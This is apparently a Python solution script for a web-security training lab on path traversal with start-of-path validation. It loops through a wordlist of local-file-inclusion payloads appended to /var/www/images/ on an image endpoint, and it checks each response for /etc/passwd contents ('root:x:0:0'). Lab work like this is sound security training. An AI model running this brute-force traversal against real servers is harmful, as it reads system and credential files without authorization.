# Lab: File path traversal, validation of start of path
import requests
from pathlib import Path

cwd = Path(__file__).resolve().parent
seclit_file_path = cwd / "lfi_jhaddix.txt"

with open(seclit_file_path, 'r', encoding="utf-8") as seclists:
    payloads = seclists.read().strip().splitlines()

base = "https://0adf009b04f9fb7a81a18e8d00150045.web-security-academy.net"
s = requests.Session()

print("===========[step1] get image with specific params===============")
# Image numbers may vary per lab → Replace with the actual filename in Burp before using
page_image = s.get(f"{base}/image", params={"filename": "/var/www/images/21.jpg"})
print("status:", page_image.status_code)
print("type:", page_image.headers["Content-Type"], "/ size:", len(page_image.content))
'''
interesting string return:

GET /image?filename=/var/www/images/21.jpg HTTP/2

'''

print("===========[step2] Do pathtraversal with absolute path to get passwd===============")
# try payloads
START = 1   # if u break input last printed num then execute

for i, payload in enumerate(payloads, start=1):   # i = linue number (from 1)
    if i < START:
        continue                                   # if already tried payload skip it
    r = s.get(f"{base}/image?filename=/var/www/images/{payload}")
    print(f"[{i}/{len(payloads)}] {r.status_code} {payload}")
    if "root:x:0:0" in r.text:
        print(f"[+] line {i} success: {payload}")
        break
